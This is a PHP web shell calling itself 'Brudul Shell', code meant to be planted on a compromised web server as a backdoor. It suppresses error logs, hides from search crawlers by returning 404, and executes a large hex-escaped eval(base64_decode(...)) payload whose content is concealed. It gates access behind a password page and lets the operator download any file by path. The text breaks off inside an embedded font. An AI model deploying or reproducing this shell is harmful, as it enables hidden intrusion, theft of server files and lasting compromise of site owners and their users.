<?php

$auth_pass = "d0763edaa9d9bd2a9516280e9044d885";

session_start();
error_reporting(0);
error_log(0);
set_time_limit(0);
@set_magic_quotes_runtime(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$color = "#00ff00";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}
eval(base64_decode("\x5a\x58\x5a\x68\x62\x43\x68\x6e\x65\x6d\x6c\x75\x5a\x6d\x78\x68\x64\x47\x55\x6f\x63\x33\x52\x79\x58\x33\x4a\x76d\x44\x45\x7a\x4b\x47\x4a\x68\x63\x32\x55\x32\x4e\x46\x39\x6b\x5a\x57\x4e\x76\x5a\x47\x55\x6f\x4a\x30\x52\x61\x59\x6b\x5a\x45\x64\x58\x64\x48\x52E\x5a\x4a\x4c\x33\x41\x32\x4c\x30\x74\x4a\x62\x47\x31\x78\x64\x57\x64\x71\x56\x47\x68\x45\x62\x57\x4a\x4c\x63\x48\x68\x61\x62\x55\x39\x49\x63\x6b\x38\x35\x4e\x55\x31\x73\x64\x56\x56\x79\x4d\x6e\x70\x77\x63\x47\x4a\x4c\x59\x6a\x6c\x75\x4c\x33\x41\x32\x65\x44\x5a\x77\x51\x7a\x6b\x76\x53\x6b\x4e\x73\x62\x55\x56\x73\x5a\x32\x59\x78\x53\x32\x78\x51\x62\x45\x68\x73\x53\x43\x73\x79\x5a\x6d\x59\x78\x61\x57\x35\x58\x61\x31\x6b\x76\x5a\x6b\x39\x59\x63\x54\x4e\x58\x64\x54\x4e\x6d\x51\x30\x49\x7a\x55\x30\x6c\x36\x62\x32\x4e\x71\x63\x32\x52\x42\x61\x30\x78\x48\x4d\x6b\x31\x70\x53\x6d\x52\x36\x59\x6d\x56\x55\x51\x55\x64\x49\x53\x46\x5a\x45\x4e\x55\x56\x32\x61\x54\x55\x35\x56\x6c\x5a\x52\x61\x57\x5a\x70\x51\x6b\x5a\x57\x54\x33\x68\x68\x54\x30\x64\x4b\x4d\x55\x70\x30\x52\x6e\x64\x57\x55\x7a\x4e\x68\x62\x30\x4e\x72\x5a\x30\x64\x76\x55\x47\x68\x76\x63\x45\x6c\x50\x57\x6a\x4e\x42\x61\x54\x64\x74\x61\x6c\x56\x73\x54\x32\x64\x77\x55\x6a\x56\x4a\x63\x56J\x50\x4fE\x59\x7a\x55\x6d\x70\x34\x4d\x46\x70\x72\x56\x6e\x4e\x5a\x56\x47\x31\x51\x59\x55\x6f\x31\x51\x56\x64\x34\x59\x57\x46\x4f\x57\x55\x4a\x75\x64\x45\x4e\x69\x64\x45\x73\x72\x63\x6b\x4a\x34\x57\x44\x42\x6b\x52\x56\x64\x45\x5a\x47\x56\x56\x61\x6c\x64\x6c\x53j\x5a\x74\x55\x7a\x6c\x69\x55\x32\x56\x43\x57\x57\x74\x5a\x54\x6c\x56\x53\x53\x6d\x31\x6a\x63\x56F\x53\x57\x55\x31\x43\x53\x45\x64\x50\x56\x6a\x49\x79\x54\x45\x64\x74\x55\x58\x5a\x6d\x64\x33\x68\x75\x62\x6b\x46\x52\x54\x56\x67\x78\x55\x32\x52\x35\x57\x46\x5a\x33\x64\x48\x68\x54\x61\x47\x68\x31\x62\x6b\x77\x79\x4d\x57\x31\x4d\x4d\x6d\x4a\x35\x5a\x57\x51\x72\x62\x32s\x33\x53\x31\x4e\x32\x56\x6b\x35\x56\x59\x6e\x42\x7a\x52\x6b\x70\x49\x54\x30\x56\x4d\x57\x58\x4a\x47\x56\x6e\x46\x5a\x64\x7a\x6c\x51T\x54\x4d\x7a\x4e\x44\x56\x4c\x4d\x57\x52\x4e\x62\x47\x49\x33\x51\x55\x56\x57\x4e\x46\x63\x32\x63\x47\x31\x51\x4d\x54\x6c\x4f\x4e\x33\x4a\x43\x63\x58\x51\x35\x4c\x7a\x56\x7a\x52\x6a\x68\x6e\x64\x46\x6c\x77\x56\x58\x41\x35\x54\x30\x74\x6c\x5a\x55\x35\x33\x65\x45\x5a\x51\x55\x46\x56\x72\x52\x6a\x42\x31\x59\x6a\x56\x33\x52\x32\x35\x43\x4d\x57\x78\x70\x61\x47\x5a\x42\x4d\x6c\x5a\x5a\x65\x6a\x45\x77\x63\x32\x31\x6f\x4e\x53\x39\x4c\x62\x6d\x68\x77\x4e\x53\x74\x4b\x62\x6b\x78\x4d\x5a\x6a\x56\x50\x63\x6b\x35\x73\x5a\x7a\x64\x55\x54\x44\x463\x52\x45\x38\x7a\x56\x31\x4e\x77\x57\x54\x6c\x74\x63\x32\x78\x45\x65\x6c\x68\x76\x51\x31\x56\x33\x59\x55\x35\x5a\x4d\x46\x67\x77\x61\x6b\x6f\x33\x57\x6d\x46\x72U\x46\x4e\x57\x53\x55\x56\x34\x52\x46\x6c\x31\x56\x58\x4a\x31\x4d\x56\x4e\x71\x4d\x32\x52\x68\x64\x45\x70\x4eZ\x47\x56\x44\x64\x57\x68\x6d\x62\x57\x6c\x48\x57\x44\x52\x5a\x57\x47\x4a\x6b\x4d\x6d\x35\x46\x61\x6d\x64\x77\x4d\x30\x6c\x6c\x4e\x7a\x46\x71\x53\x46\x52\x42\x56\x6e\x56\x32\x54\x44\x4e\x72\x57\x44\x45\x78\x61\x55\x39\x61\x53\x7a\x45\x79\x54\x6e\x52\x4d\x64\x32\x35\x56\x51\x33\x6c\x35\x54\x45\x39\x48\x4e\x6b\x51\x7a\x5a\x56\x56\x76\x63\x31\x42\x4f\x62\x7a\x4e\x49\x4d\x6e\x6c\x4f\x56\x46\x49\x35\x54\x55\x5a\x32\x57\x6d\x64\x70\x52\x30\x6b\x78\x55\x56\x42\x4d\x61\x45\x52\x55\x65\x58\x4e\x44\x4d\x54\x42\x78\x53\x55\x51\x78\x4d\x44\x52\x36\x53\x47\x38\x33\x4d\x33\x4e\x6e\x59\x7a\x46\x4c\x64\x58\x70\x4f\x64\x47\x74\x4b\x56\x6c\x67\x32\x4f\x58\x4e\x78\x64\x6d\x6c\x5a\x61\x55\x52\x5aa\x31\x46\x35\x53\x55\x6c\x61\x61\x33\x6c\x57\x4f\x55\x46\x43\x61\x30\x35\x73\x63\x56\x49\x78\x65X\x70\x71\x5a\x44\x6c\x31\x62\x6d\x6c\x4f\x64\x55\x70\x55\x55\x6b\x4e\x4c\x54\x55\x70\x61\x54\x57\x45\x30\x54\x57\x68\x4c\x61\x32\x34\x31\x55\x45\x77\x76\x53\x56\x4a\x6c\x4e\x55\x34\x30\x65\x55\x70\x7a\x64\x31\x52\x44\x51\x7a\x4e\x73\x64\x57\x31\x79\x5a\x54\x64\x5a\x51\x7a\x4a\x52\x4d\x54\x68\x4b\x51\x54\x46\x52\x55\x33\x70\x73\x59\x56\x64\x68\x4e\x56\x4d\x7a\x61\x31\x42\x33\x4f\x46\x56\x46\x63\x57\x56\x72\x55\x79\x39\x68\x63\x7a\x4e\x36\x4e\x6e\x46\x78\x63\x58\x64\x53\x4e\x48\x52\x58\x4d\x57\x70\x4a\x65\x6a\x52\x75\x64\x57\x64\x54\x52\x57\x52\x54\x53\x55\x46\x6c\x57U\x4a\x6c\x51\x30\x39\x5a\x65\x57\x46\x4d\x51\x32\x74\x61\x53\x33\x4d\x32\x52\x48\x42\x74\x56\x7a\x5a\x59\x56\x31\x56\x4b\x63k\x59\x76\x54\x31\x68\x46\x52\x33\x4e\x35\x52\x7a\x5a\x47\x56\x6c\x56\x6b\x54\x30\x74\x53\x53\x57\x45\x76\x63\x33\x64\x49\x61\x6e\x70\x35\x54\x6d\x31\x6f\x64\x55\x35\x69\x53\x6b\x39\x58\x59\x31\x52\x46\x4f\x47\x70\x50\x5a\x6a\x4d\x79\x4d\x31\x4e\x7a\x5a\x55\x68\x78\x4b\x30\x46\x53W\x6c\x70\x59\x53\x58\x6f\x31\x62\x46\x45\x72\x54\x31\x67\x34\x62\x33\x49\x72\x4b\x30\x74\x5a\x64\x56\x64\x30\x53\x44\x4e\x75\x65\x6e\x5a\x76\x57\x54\x56\x6f\x4b\x7a\x64\x4c\x55\x30\x31\x54\x4d\x6b\x74\x69\x62\x54\x59\x79\x4f\x56\x68\x69\x53\x58\x41\x30\x4e\x31\x68\x53\x65\x6b\x70\x78\x5a\x6b\x5a\x32\x5a\x55\x4d\x34\x54\x30\x68\x52\x61\x56\x45\x79\x62\x55\x31\x4bZ\x6a\x46\x48\x61\x57\x4a\x58\x4d\x54\x64\x6e\x64\x33\x6c\x4e\x59\x6b\x74\x74\x4e\x6a\x64\x45\x55\x55\x52\x56\x4d\x54\x6c\x57\x4d\x6b\x46\x6c\x61\x48\x4e\x48\x59\x6e\x70\x51\x54\x6b\x31\x30\x4e\x6c\x68\x6b\x52\x54\x5a\x76\x54\x45\x31\x35\x53\x79\x38\x33\x62\x32\x6c\x72\x4e\x33\x52\x44\x61\x47\x31\x71\x5a\x47\x5a\x34\x61\x44\x52\x30\x59\x31\x70\x6c\x62\x58\x63\x35\x4d\x6e\x70\x4b\x61T\x4a\x30\x62\x6b\x4e\x59\x59\x6d\x31\x46\x51\x6e\x52\x45\x53\x6b\x52\x6d\x63\x33\x64\x51\x4b\x7a\x4d\x72\x4e\x6a\x6c\x36\x64\x55\x52\x30\x61\x56\x6c\x50\x5a\x58\x4a\x33\x52\x54N\x53\x53\x33\x52\x4ab\x54\x46\x79\x55\x6a\x52\x77\x52\x6e\x59\x78\x4f\x46\x6f\x35\x62\x6b\x46\x76\x63\x6d\x56\x54\x63\x55\x78\x4c\x64\x48\x46\x47\x53\x48\x52\x47\x5a\x56\x64\x4a\x4b\x7a\x52\x5a\x59\x6b\x39\x69\x53\x31\x6c\x49\x62\x48\x42\x30\x4f\x45\x31\x4a\x52\x6d\x45\x32\x51\x6b\x74\x51\x64\x44\x56\x6e\x61\x58\x67\x72\x63\x47\x6c\x33\x55\x6b\x6c\x49\x64\x45\x70\x33\x57\x6b\x4a\x73\x4e\x6a\x55\x72\x64k\x4d\x72\x65\x47\x46\x78\x5a\x6e\x6f\x76\x56\x44\x55\x33\x63\x6e\x52\x5a\x4c\x33\x5a\x74\x61\x6a\x42\x6f\x4e\x46\x5a\x50\x51\x6d\x34\x35\x4d\x47\x64\x74\x56\x6d\x39\x58\x4c\x30\x74\x50\x4d\x45\x31\x49\x53\x30\x46\x68\x64\x45\x67\x78\x57\x575\x34\x65\x45\x31\x61\x51\x55\x39\x36c\x33\x42\x7a\x52\x47\x70\x4f\x54\x54\x59\x30\x55\x7a\x4d3\x54\x6c\x52\x79\x61\x46\x63\x33S\x45\x78\x48\x4b\x31\x46\x46\x64\x47\x74\x61\x52\x55\x46\x68\x54\x6a\x5a\x47\x4c\x33\x6c\x71\x52\x55\x70\x48\x51\x6d\x4a\x54\x55\x45\x39\x46\x65\x43\x39\x46\x61\x55\x56\x4d\x4c\x30\x35\x42\x56\x48\x64\x30\x57\x53\x39\x71\x4e\x45\x39\x50\x52\x56\x6c\x47\x53\x45\x6c\x6b\x57\x56\x5a\x4e\x4d\x6e\x42\x52\x4f\x56\x6c\x73\x56\x46\x68\x30\x55\x48\x59\x79\x54\x7a\x64\x68\x57\x48\x68V\x63\x45\x59\x79\x59\x55\x52\x45\x62\x48\x42\x77\x52\x48\x42\x30\x59\x31\x59\x72\x62\x55\x39\x4b\x56\x30\x68\x78\x55\x48\x46\x54\x53\x44\x460\x4d\x6e\x6c\x57\x62\x33\x6c\x6f\x5a\x45\x4e\x44\x57\x47\x78\x47\x63\x6d\x64\x44\x61\x55\x31\x68\x53\x33\x56\x57\x57\x6e\x4e\x30\x63\x55\x31\x46\x59\x53\x38\x30\x54\x54\x42\x6b\x5a\x56\x64\x34\x4d\x44\x6c\x4b\x4d\x32\x6f\x7a\x54\x6e\x5a\x33\x55\x55\x31\x7a\x4d\x32\x35\x58\x63\x57\x68\x77\x52\x57\x39\x79\x4e\x6b\x64R\x53\x6c\x64\x6e\x5a\x30\x4d\x72\x63\x58\x5a\x5a\x55\x6d\x4a\x36\x56\x6b\x5a\x71Z\x46\x6c\x73\x63\x32\x63\x78\x61\x47\x59\x78\x5a\x30\x34\x78\x61\x6a\x51\x34\x61\x45\x6c\x69\x62\x6b\x4a\x52\x57\x6a\x42\x57\x4d\x30\x46\x4c\x4d\x31\x4e\x4c\x56\x57\x64\x76\x57\x57\x74\x30\x4e\x6b\x46\x57\x62\x58\x52\x58\x63\x6a\x49\x79\x4e\x6e\x70\x74\x4d\x69\x39\x51\x53\x57\x64\x6f\x51\x6b\x4e\x42\x4c\x7a\x52\x5a\x5a\x47\x49\x72\x64\x48\x52\x77\x62\x32\x56\x4b\x4d\x32\x70\x32\x52\x47\x52\x4e\x64\x54\x4a\x34\x61\x46\x56\x43\x4d\x6e\x51\x31\x53\x48\x5a\x32Q\x57\x31\x51\x63\x32\x51\x78\x61\x46\x64\x35\x61\x7a\x46\x52\x4e\x6b\x68\x6d\x57\x46\x6c\x4f\x54\x33\x4a\x59\x4e\x6c\x4a\x6b\x4e\x55\x45\x34\x53\x31\x68\x55Q\x6d\x46\x54\x52\x57\x39\x58\x56\x32\x39\x70\x59\x55\x5a\x72\x63\x57\x6by\x63\x33\x70\x69\x63\x6b\x5a\x49\x62\x48\x52\x44\x62\x46\x51y\x5a\x45\x31\x6b\x59\x31\x68\x76\x62\x6e\x46\x6c\x5a\x47\x31\x4b\x54\x56\x4e\x31\x63\x6d\x56\x43\x5a\x33\x52\x61\x62\x55\x52\x50\x64\x6d\x46\x7a\x56\x44\x64\x34\x55\x54\x52\x72\x59\x32\x68\x4f\x65\x58\x56\x45\x65\x54\x46\x46\x62\x33\x68\x70\x64\x46\x4e\x4d\x4f\x58\x6c\x75\x5a\x47\x6c\x33\x57\x45\x68\x53\x5a\x32\x39\x52\x5a\x7a\x6c\x44\x62\x53\x74\x42\x4d\x31\x46\x35\x61\x7a\x46\x4d\x64\x48\x64\x4d\x62\x53\x74\x35\x4e\x7a\x56\x4d\x63\x31\x56\x35\x56\x6c\x46\x72\x53\x6b\x78\x59\x65\x55\x52\x76\x64\x57\x56J\x4d\x55\x52\x73\x56\x57\x52\x58\x4e\x6e\x42\x4d\x52\x6e\x42\x6e\x5a\x55\x5a\x4f\x5a\x56\x68\x43\x5a\x30\x63\x30\x53\x33\x5a\x75\x65\x46\x6c\x6f\x52\x6c\x5a\x76\x52\x6d\x56\x78\x55\x6b\x4e\x44\x57\x45\x45\x34\x4d\x47\x77\x7a\x64\x46\x64\x45\x64\x58\x45\x7a\x61\x47\x35\x68\x59\x55\x78\x6b\x64\x33\x64\x61\x53\x58\x41\x34\x5a\x58\x64\x44\x51\x30\x70\x75\x4c\x33\x56\x36\x4d\x55\x46\x6c\x65\x56\x46\x43\x51\x6e\x56\x69\x53\x48\x4e\x56\x52\x56\x41\x76\x53\x56\x6b\x79\x63\x6d\x6cD\x54\x32\x78\x77\x5a\x6e\x4e\x34\x52\x44\x5a\x45\x65\x47\x46\x48\x5a\x6b\x67\x34\x61\x58\x64\x75\x54\x6d\x74\x68\x4f\x45\x4a\x43\x52\x45\x4e\x36\x55\x31\x64\x6c\x52\x6b\x31\x50\x53\x6d\x4a\x32\x54\x57\x52\x43\x65\x69\x39\x4a\x4d\x56\x46\x43Z\x47\x59\x76\x64\x6c\x46\x6d\x51\x6d\x31\x47\x54\x47\x30\x72\x62\x31\x64\x73\x65\x44\x6c\x6c\x56\x57\x70\x47\x53\x54\x5a\x6e\x51\x31\x52\x6f\x53\x6d\x4a\x69\x54\x30\x5a\x77\x5a\x6d\x31\x33\x4d\x45\x78\x75\x54\x6d\x78\x30\x56\x53\x74\x75\x54\x54\x59\x34\x52\x53\x74\x52\x59\x53\x74\x56\x61k\x4a\x77\x64\x31\x4e\x6e\x59\x55\x4e\x46\x4d\x6c\x42\x76\x4c\x32\x4e\x56\x51\x6e\x68\x68\x65\x57\x31\x4e\x57\x47\x74\x6f\x54\x6d\x70\x7a\x61\x45\x56\x75\x63\x32\x70\x7a\x57\x58\x52\x54\x56\x6c\x5a\x5a\x59\x33\x56\x5a\x61\x45\x52\x78\x4d\x56\x56\x34\x55\x47\x46\x77\x57\x6a\x52\x61\x5a\x6d\x38\x32\x4c\x32\x68\x45\x54\x53\x39\x32\x63\x30\x31\x6b\x52\x45\x46\x30\x55\x30\x4e\x4e\x59\x32\x68\x42\x59\x6a\x59\x34\x54\x6d\x4d\x32\x62\x6a\x41\x72\x4b\x31\x42\x30\x56\x56\x52\x55\x56\x6d\x68\x50\x56\x56\x63\x79\x51\x55\x4e\x36\x55\x31A\x79\x52\x55\x5a\x4a\x5a\x6e\x4a\x46\x61\x47\x4e\x49\x65\x45\x56\x6c\x51\x6d\x6b\x33\x57\x47\x31\x6d\x62\x46\x56\x4a\x53\x6b\x64\x58\x53\x6d\x39\x4d\x63\x30\x46\x4f\x4f\x56\x4e\x6d\x65\x6d\x31\x4f\x62\x32\x74\x74\x53\x57\x38\x31\x63\x31\x56\x4a\x52j\x64\x4e\x54\x6d\x70\x45\x62\x47\x6f\x33\x57\x6b\x5a\x78\x5a\x32\x52\x58\x54\x30\x74\x6b\x59\x6d\x64\x6d\x64\x58\x5a\x6a\x52\x58F\x61\x5a\x30\x70\x73\x4e\x32\x63\x7a\x56\x559\x31\x4e\x58\x64\x4c\x53\x57\x4a\x33\x61\x31\x4e\x76\x54\x30\x4e\x4b\x51\x56\x46\x77\x65\x55\x68\x75\x53\x45\x30\x79\x4e\x47\x4e\x68\x4e\x6a\x4a\x31\x52\x46\x6f\x31\x57\x48\x4d\x78\x51\x6c\x68\x56\x61\x69\x39\x70\x5a\x57\x64\x57\x53\x44\x63\x79\x61\x54\x51\x78\x4f\x56\x5a\x58\x53\x54\x42\x7a\x55\x44\x64\x31\x65\x56\x6c\x46\x55\x58\x52\x68\x4d\x6d\x63\x31\x51\x6b\x64\x55\x51\x6e\x45\x32\x5a\x31\x5a\x78\x64\x57\x30\x34\x55\x6d\x56\x33\x51\x30\x30\x78\x55\x6a\x49\x33\x51\x6a\x42\x72\x52\x58\x46\x6a\x55\x55\x46\x56\x64\x55\x52\x32\x54\x6a\x68\x46\x4e\x6d\x52\x61\x4e\x55\x78\x46\x65\x46\x70\x43\x59\x30\x77\x7a\x63\x79\x74\x5a\x64\x44\x5a\x49\x55\x57\x56\x55\x53\x31\x4a\x34\x4d\x32\x55\x34\x52\x47\x6c\x48\x53\x55\x35\x56\x64\x6a\x56\x58\x59\x32\x74\x57\x62\x48\x5a\x6b\x4f\x54\x46\x53\x64\x48\x70\x56\x55\x6b\x4a\x77c\x7a\x59\x76\x63\x30\x56\x56\x5a\x47\x68\x49T\x7a\x56\x55\x65\x47\x49\x72\x52\x30\x5a\x4b\x62\x79\x74\x4e\x55\x6b\x6c\x73\x51\x30\x31\x35\x5a\x46\x49\x31\x61\x6c\x46\x4d\x4f\x48\x42\x53\x4e\x55\x39\x4a\x64\x31\x68\x6a\x53\x56\x56\x54\x63\x48\x70\x51\x51\x6b\x56\x4c\x52\x6e\x6b\x79\x4f\x45\x35\x6d\x57\x6b\x64\x56\x61\x57\x39\x4f\x63\x32\x55\x33\x64\x30\x52\x6c\x65\x48\x64\x54\x57\x54\x56\x36\x65\x47\x73\x7a\x54\x56\x6c\x78\x56\x31\x49\x35\x51\x6e\x6c\x61\x55\x6b\x68\x47\x52\x54h\x74\x54\x44\x68\x74\x4b\x33\x6c\x6b\x63\x32\x4d\x79\x53\x47\x59\x34\x65\x55\x5av\x53\x6d\x68\x44\x64\x31\x4e\x6a\x53\x55\x70\x52\x4f\x48\x68\x74\x4f\x47\x68\x4d\x61\x55\x68\x45\x56\x55\x52K\x64\x32\x30\x32\x59\x30\x4d\x7a\x52\x6c\x6c\x30\x4e\x6a\x67\x72Y\x6d\x39\x4a\x62\x53\x39\x52\x51\x55\x5a\x6f\x4d\x48\x56\x34\x56\x6b\x78\x4d\x62\x58\x52\x69\x53\x6e\x56\x55\x64\x47\x56\x44\x4e\x46\x42\x6f\x57\x6b\x59\x34\x4e\x58\x64\x50\x5a\x55\x6f\x7a\x53\x6c\x64\x4b\x4f\x47\x46\x35\x5a\x6b\x31\x6a\x51\x56\x70\x73\x59\x6e\x64\x52\x54\x48\x52\x33\x65\x6b\x64\x79\x4f\x55\x39\x31\x64\x56\x42\x6f\x56\x6c\x55\x7a\x4c\x32\x31\x52\x54\x33\x46\x58\x53\x45\x31\x33\x51\x31F\x32\x4e\x6a\x56\x5a\x61\x6d\x74\x4aa\x6c\x6c\x70\x4c\x32\x49\x77\x62\x58\x6f\x7a\x4e\x47\x4e\x4a\x4e\x46\x4d\x7a\x4d\x33\x52\x44\x53\x58\x4d\x72\x64\x57\x4a\x73\x4f\x48\x52\x55\x4e\x6c\x51\x35\x4d\x7a\x4a\x69\x64\x33\x70\x6f\x61\x30d\x6f\x542\x5a\x43\x55\x58\x68\x50\x57\x6b\x35\x36\x4f\x45\x39\x55\x52E\x46\x4b\x4e\x33\x56\x74\x53\x44\x4d\x76\x59\x31\x56\x55\x64\x48\x59\x34\x55\x6b\x4a\x68\x63\x46\x56\x58\x4d\x6b\x4a\x36\x65\x6a\x4d\x32\x5aU\x6c\x7a\x4e\x30\x52\x58\x62\x47\x63\x79\x62\x45\x70\x78\x52\x6b\x56\x61d\x54\x4e\x79\x61\x44\x5a\x6b\x56\x6c\x45\x78\x57\x47\x56\x6d\x56\x30\x56\x47\x56\x44\x52\x30\x63\x54\x49\x35\x4d\x47\x4a\x35\x62\x6b\x4e\x34\x4d\x56\x6c\x59\x61\x6a\x52\x33\x64\x6d\x70\x6e\x5a\x6b\x68\x7a\x55\x55\x56\x73\x4f\x43\x74\x6d\x55\x7a\x4a\x6c\x63\x6b\x70\x6d\x62z\x68\x7a\x4b\x32\x78\x54\x4d\x32\x70\x35\x4d\x56\x52\x69\x57\x47\x46\x69\x4e\x30\x52\x72\x4c\x33\x4e\x55\x4d\x32\x31\x54\x51\x31\x56\x7a\x64\x47\x4d\x33\x54\x58\x68\x75\x65\x48\x56\x77\x51\x6a\x63\x77\x52\x329\x6e\x54\x56\x49\x7a\x62\x471\x4c\x4f\x45\x6f\x76\x5a\x45\x74\x45\x4d\x57\x46\x42\x55\x6c\x59\x33\x55\x56\x4a\x6e\x64\x6d\x74\x54\x54\x6c\x49\x33\x4e\x58\x55\x78\x62\x7a\x52\x30\x59\x55\x70\x54\x65\x56\x52\x6eW\x57\x78\x71\x54\x6d\x56\x53\x56\x56\x5a\x42\x4c\x32\x31\x74\x62\x46\x52\x61\x56\x31\x68\x6d\x51\x7a\x46\x46\x56\x32\x4a\x45\x57\x56\x4a\x77\x4d\x47\x30\x30\x64\x48\x52\x58\x4b\x31\x68\x36\x51\x56\x51\x31\x4f\x54\x56\x42\x55\x31\x51\x33\x57\x53\x74\x71\x61\x7a\x46\x6e\x4e\x54\x68\x53\x55\x47\x6c\x61\x64\x55\x30\x35\x63\x57\x70\x74\x522\x55\x35\x54\x48\x415\x57\x56\x51\x34\x54\x45\x4a\x6b\x63\x44\x63\x78\x4f\x55\x64\x5a\x51\x6c\x4e\x31\x61\x32\x78\x53\x53\x53\x38\x32\x53\x44\x49\x33\x4e\x33\x56\x56\x56\x48\x42\x31\x56\x6c\x55\x79\x62\x56\x42\x6c\x54\x33\x52\x5a\x65\x47\x31\x50\x52\x55\x4e\x69\x5a\x47\x63\x30\x59\x31\x4a\x79\x4d\x6d\x78\x4d\x62\x6d\x5a\x76\x56\x6cQ\x35\x55\x6c\x42\x51\x56\x6c\x5a\x7a\x64\x47\x55\x78\x53\x56\x64\x4f\x65\x57\x5a\x48\x61\x55\x39\x6a\x5a\x31\x52\x71\x61\x46\x6b\x72\x62\x58\x52\x4b\x5a\x45\x78\x53\x57\x69\x74\x71\x54\x53\x74\x4e\x54\x48\x42\x4e\x55\x56\x59\x35\x55\x31\x46\x30\x55\x6e\x68\x55\x54\x55\x38\x30\x63\x30\x67\x77\x4e\x6a\x42\x73\x51\x32\x4e\x73\x5a\x46\x51\x72\x55\x6c\x6c\x4d\x4d\x30\x4a\x70\x64\x48\x4d\x35\x62\x31\x6f\x78\x62\x46\x56\x72\x57\x46\x56\x6f\x59\x6e\x45\x76\x62\x57\x74\x49\x65\x45\x4e\x78\x63\x32\x70\x4f\x62\x6a\x42\x51\x64\x48\x64\x35\x65\x47\x70\x50\x59\x33\x4e\x56\x55\x54\x6c\x54\x57\x45\x4e\x43\x65\x6a\x6c\x32\x54\x31\x595\x53\x56\x4e\x47\x4e\x57\x64\x31\x4f\x44\x5a\x55\x65\x57\x74\x36\x63\x32\x68\x50\x51\x54\x64\x47\x4d\x6b\x31\x48\x55\x30\x4e\x6aR\x57\x31\x30\x4d\x57\x4e\x32c\x47\x39\x76\x56\x45\x68\x61\x51\x6d\x55\x35\x5a\x6e\x5a\x44\x4c\x30\x39\x53\x51\x31\x68\x73\x59\x55\x49\x72\x65\x44\x46\x73\x4d\x6a\x5a\x59\x59\x6a\x63\x32\x51\x6d\x77\x79\x53\x44\x4a\x51\x62\x30\x4e\x55\x4e\x44\x4e\x76\x56\x30\x74\x52\x63\x31\x56\x6cU\x31\x46\x34\x53\x48\x67\x30\x62\x30\x31\x52\x62\x47\x70\x54\x5a\x58\x6c\x45\x5a\x58\x5a\x61S\x6d\x46\x4a\x53\x47\x46\x50\x53\x55\x67\x72\x63\x6b\x39\x72\x56\x48\x4e\x42\x57\x6b\x38\x72\x51\x58\x4e\x49\x52\x33B\x42\x53\x6c\x59\x32\x61\x45\x6b\x77\x4c\x7a\x51\x33\x53\x58\x49\x79\x4f\x47\x38\x7a\x57\x57\x56\x4a\x59\x6b\x5a\x30\x61\x57\x5a\x33\x65\x58\x42\x6a\x64\x54\x64\x4f\x4d\x47\x56\x7a\x62\x33\x64\x78\x54\x30\x68\x4d\x56\x6b\x4a\x58\x56\x33\x42\x4f\x55\x57\x70\x6f\x61\x44\x4e\x78\x59\x6c\x59\x35\x4f\x55\x5a\x5a\x55\x31\x68\x52\x64\x45\x68\x4d\x61\x44\x68\x70\x51\x58\x46\x52\x57\x55\x4e\x47\x55\x48\x6f\x33\x51\x6b\x56\x51\x63\x54\x4d\x33\x4c\x79\x73\x76\x64\x47\x73\x76\x4c\x33\x64\x4e\x50\x53\x63\x70\x4b\x53\x6b\x70\x4f\x77\x3d\x3d"));

function login_shell() {
?>

<html>
<head>
<title>Login Page</title>
<style type="text/css">
html {
    margin: 20px auto;
    background:black;
    color: green;
    text-align: center;
}
pre {
    color: white;
}

input[type=password] {
	background:transparent;
	color:white;
	margin:0 10px;
	font-family:Homenaje;
	font-size:13px;
	border:2px solid white;
}

</style>
</head>
<center>
<br>
<br>
<header>
<img src='http://con7ext.xaisyndicate.com/images/eromanga.png' width='400' height='400' align='center'>
<br>
<br>
<form method="post">
<input type="password" name="pass">
</form>

<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<head>
<title>Brudul Shell</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
  <script src="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.5/js/bootstrap.min.js"></script>
  <style>
@font-face {
    font-family: 'ubuntu_monoregular';
src: url(data:application/x-font-woff;charset=utf-8;base64,d09GRgABAAAAAGWIABMAAAAAvDAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAABGRlRNAAABqAAAABwAAAAcZO+HdEdERUYAAAHEAAAAKQAAACwCIwEJR1BPUwAAAfAAAAAyAAAAQDXOTrBHU1VCAAACJAAAAVkAAAIGlNvJqE9TLzIAAAOAAAAAXQAAAGCZVQTZY21hcAAAA+AAAAGOAAAB6gCLjBZjdnQgAAAFcAAAAEoAAABKE0kOc2ZwZ20AAAW8AAABsQAAAmVTtC+nZ2FzcAAAB3AAAAAIAAAACAAAABBnbHlmAAAHeAAAVmEAAKW0Irt2PGhlYWQAAF3cAAAAMAAAADYAy2LDaGhlYQAAXgwAAAAcAAAAJAqmBP9obXR4AABeKAAAAWgAAAOihmFxCGxvY2EAAF+QAAAByAAAAdQOUTaQbWF4cAAAYVgAAAAgAAAAIAIGAhVuYW1lAABheAAAAXsAAAPOYleKrXBvc3QAAGL0AAAB4gAAAtQsBqUMcHJlcAAAZNgAAACnAAABBqQTvG53ZWJmAABlgAAAAAYAAAAGdVtSpgAAAAEAAAAAzD2izwAAAADJ5b7LAAAAAM7MJdl42mNgZGBg4ANiFQYQYGJgBuI6BkaGeoZGIKuJ4QWQzQKWYQAANmIDLQAAAHjaY2BkYGDgYrBhsGNgTq4symEQSS9KzWaQy0ksyWPQYGAByjL8/w8ksLGAAAB3kwv7AAB42nWRx0pDQRiFv